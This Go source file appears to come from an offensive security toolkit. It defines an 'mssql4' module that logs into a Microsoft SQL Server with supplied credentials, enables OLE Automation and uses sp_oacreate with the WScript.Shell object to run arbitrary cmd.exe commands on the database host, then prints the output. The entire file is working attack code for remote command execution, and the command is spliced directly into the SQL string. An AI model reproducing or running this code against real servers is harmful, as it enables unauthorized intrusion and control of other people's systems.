package sqlcmdmodule

import (
	"cube/gologger"
	"database/sql"
	"fmt"
	_ "github.com/denisenkom/go-mssqldb"
)

type Mssql4 struct {
	*Sqlcmd
}

func (m Mssql4) SqlcmdName() string {
	return "mssql4"
}

func (m Mssql4) SqlcmdPort() string {
	return "1433"
}

func (m Mssql4) SqlcmdDesc() string {
	return "exec cmd via sp_oacreate com object"
}

func (m Mssql4) SqlcmdExec() SqlcmdResult {
	result := SqlcmdResult{Sqlcmd: *m.Sqlcmd, Result: "", Err: nil}

	dataSourceName := fmt.Sprintf("server=%v;port=%v;user id=%v;password=%v;database=%v", m.Ip,
		m.Port, m.User, m.Password, "tempdb")
	conn, err := sql.Open("mssql", dataSourceName)
	defer conn.Close()
	if err != nil {
		result.Err = err
		return result
	}
	if m.Query == "clear" {
		closeOle(*conn)
		fmt.Println("Clear sp_oacreate Successful")
		return result
	}
	OpenOle(*conn)
	osShellCom(*conn, m.Query)

	return result
}

func osShellCom(conn sql.DB, cmd string) {
	sqlstr := fmt.Sprint("declare @shell int,@exec int,@text int,@str varchar(8000); \n" +
		"exec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@shell output\nexec sp_oamethod @shell,'exec',@exec output,'c:\\windows\\system32\\cmd.exe /c " + cmd + "'\nexec sp_oamethod @exec, 'StdOut', @text out;\nexec sp_oamethod @text, 'ReadAll', @str out\nselect @str")
	gologger.Debug(sqlstr)
	rows, err := conn.Query(sqlstr)
	if err != nil {
		panic(err.Error())

	}
	defer rows.Close()

	columns, err := rows.Columns()
	if err != nil {
		panic(err.Error())
	}
	values := make([]sql.RawBytes, len(columns))
	scanArgs := make([]interface{}, len(values))
	for i := range values {
		scanArgs[i] = &values[i]
	}

	for rows.Next() {
		err = rows.Scan(scanArgs...)
		if err != nil {
			panic(err.Error())
		}
		var value string
		for _, col := range values {
			if col == nil {
				value = ""
			} else {
				value = string(col)
			}
			fmt.Println(value)

		}

	}
	if err = rows.Err(); err != nil {
		panic(err.Error()) // proper error handling instead of panic in your app
	}
}
